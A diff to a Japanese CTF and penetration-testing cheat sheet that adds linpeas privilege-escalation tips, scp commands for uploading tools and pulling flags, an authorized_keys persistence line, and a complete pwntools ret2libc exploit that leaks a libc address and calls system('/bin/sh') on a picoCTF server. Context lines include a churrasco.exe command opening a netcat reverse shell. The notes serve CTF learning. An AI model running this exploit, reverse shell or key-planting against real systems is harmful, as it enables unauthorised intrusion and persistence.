@@ -57,6 +57,7 @@ socialImage: "/media/cards/no-image.png"
   - [ローカル特権昇格ツール](#ローカル特権昇格ツール)
 - [内部探索(Linux)](#内部探索linux)
   - [便利コマンド](#便利コマンド)
+  - [linpeasのTips](#linpeasのtips)
 - [特権取得(Linux)](#特権取得linux)
 - [pwnのTips](#pwnのtips)
   - [プロセスにバイトコードを送り込む](#プロセスにバイトコードを送り込む)
@@ -66,6 +67,7 @@ socialImage: "/media/cards/no-image.png"
   - [GOT Overwriteサンプル](#got-overwriteサンプル)
   - [glib、リンカのバージョン問題](#glibリンカのバージョン問題)
   - [ローカルでバイナリをxintedする](#ローカルでバイナリをxintedする)
+  - [Heap Exploit](#heap-exploit)
   - [Pwn参考記事](#pwn参考記事)
 - [gdbのTips](#gdbのtips)
   - [フラグ置き換え方法](#フラグ置き換え方法)
@@ -615,10 +617,60 @@ churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.10.1 9999"
 
 ``` bash
 # scp
-# upload
-scp user.txt kali@10.10.14.3:/home/kali/Downloads
-# download
-scp user@targethost.htb:/home/kali/user.txt ./
+## upload
+scp /home/kali/Hacking/Tools/linpeas.sh user@targethost.htb:/home/user
+
+## download
+scp user@targethost.htb:/home/user/user.txt ./
+
+# ssh
+echo "<pub key>" > ~/.ssh/authorized_keys
+```
+
+### linpeasのTips
+
+- 実行と読み取り
+
+``` bash
+$ ./linpeas.sh -a tee linpeas.txt
+$ less -r linpeas.txt
+```
+
+- 良くチェックする項目
+
+```bash
+- Basic information
+  - OSバージョンやUser、Group、Hostname、Writable folder
+
+- System Information
+  - カーネルバージョン、環境変数、Datetime、Systam stat、CPU情報など
+  - [Executing Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)の結果
+  - [Executing Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)の結果
+
+- Processes, Cron, Services, Timers & Sockets
+  - 特にroot権限で動いているプロセスやcronを探してみる
+  - Binary processes permissions
+  - Cron jobs
+  - Services
+
+- Content of /etc/inetd.conf & /etc/xinetd.conf
+- Active Ports
+- Users Information
+  - sudo -l
+  - Superusers
+  - All users & groups
+  - Login now
+  
+- Software Information 
+  - Database
+  - Webサーバ
+  - PHP
+  - SSH
+  - passwdファイル
+
+- Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+- Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders
+- Finding *password* or *credential* files in **
 ```
 
 
@@ -638,34 +690,51 @@ from pwn import *
 import binascii
 import time
 
-elf = ELF("./chall")
+elf = ELF("./vuln")
 context.binary = elf
-# rop = ROP(elf)
 
-nopsled = b"\x41"*72
-payload = nopsled
+puts_plt = 0x400540
+got_plt_scanf = 0x601038
+rop_rdi_ret = 0x400913
+ret = 0x40052e
+main = 0x400771
 
 # Local
-p = process("./chall")
+p = process("./vuln")
 
 # Remote
-p = remote("bof.pwn.wanictf.org", 9002)
+p = remote("mercury.picoctf.net", 42072)
 
-r = p.recv()
+payload = b""
+payload += b"\x41"*128
+payload += b"\x42"*8
+payload += p64(rop_rdi_ret)
+payload += p64(got_plt_scanf)
+payload += p64(puts_plt)
+payload += p64(main)
+
+r = p.recvline()
+p.sendline(payload)
+r = p.recvline()
+
+leakaddr = u64(p.recvline().rstrip().ljust(8, b"\x00"))
+# print(hex(leakaddr))
+
+base_addr = leakaddr - 0x07bf30
+system_addr = base_addr + 0x04f4e0
+str_bin_sh = base_addr +  0x1b40fa
+
+payload = b""
+payload += b"\x41"*128
+payload += b"\x42"*8
+payload += p64(ret)
+payload += p64(rop_rdi_ret)
+payload += p64(str_bin_sh)
+payload += p64(system_addr)
+
 r = p.recvline()
 p.sendline(payload)
 p.interactive()
-
-# shellcode = p64(0xc6a8b9f731892800)
-# p.sendline(payload)
-# p.sendline(b"A"*72 + b"%08x."*20)
-
-# r = p.recvline()
-# shellcode = p64(int(r.strip(), 0x10))
-# shellcode2 = p64(0x4011db)
-# p.sendline(payload + shellcode + b'\x41'*8 + shellcode2)
-
-
 ```
 
 - 標準入出力を使う
@@ -710,6 +779,8 @@ string.ascii_uppercase + string.ascii_lowercase + "0123456789"
   | pop rdi; ret |
   |  `/bin/sh`   |
   |   system()   |
+
+- systemのアドレスを使用してもシェルが取れない場合は、アラインメントでセグメント違反が出ていないかを確認してみる
 
 - PLTを探索する
 
@@ -810,6 +881,10 @@ service app
 sudo service xinetd start
 nc localhost 10080
 ```
+
+### Heap Exploit
+
+- [よちよちCTFerがHeap完全に理解したになるまでのメモ](/ctf-learning-heap)
 
 ### Pwn参考記事
 
